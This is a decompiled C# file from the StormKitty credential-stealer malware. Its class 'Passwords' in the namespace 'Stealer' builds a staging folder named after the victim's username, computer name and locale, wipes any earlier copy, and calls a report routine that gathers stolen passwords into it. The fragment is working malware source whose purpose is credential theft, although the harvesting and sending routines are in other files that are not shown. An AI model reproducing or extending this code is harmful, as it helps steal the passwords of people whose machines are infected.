﻿using System;
using System.IO;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000018 RID: 24
	internal sealed class Passwords
	{
		// Token: 0x0600006C RID: 108 RVA: 0x000043D4 File Offset: 0x000025D4
		public static string Save()
		{
			Console.WriteLine("Running passwords recovery...");
			if (!Directory.Exists(Passwords.PasswordsStoreDirectory))
			{
				Directory.CreateDirectory(Passwords.PasswordsStoreDirectory);
			}
			else
			{
				try
				{
					Filemanager.RecursiveDelete(Passwords.PasswordsStoreDirectory);
				}
				catch
				{
					Console.WriteLine("Failed recursive remove directory");
				}
			}
			if (Report.CreateReport(Passwords.PasswordsStoreDirectory))
			{
				return Passwords.PasswordsStoreDirectory;
			}
			return "";
		}

		// Token: 0x0400006A RID: 106
		private static string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), string.Concat(new string[]
		{
			SystemInfo.username,
			"@",
			SystemInfo.compname,
			"_",
			SystemInfo.culture
		}));
	}
}
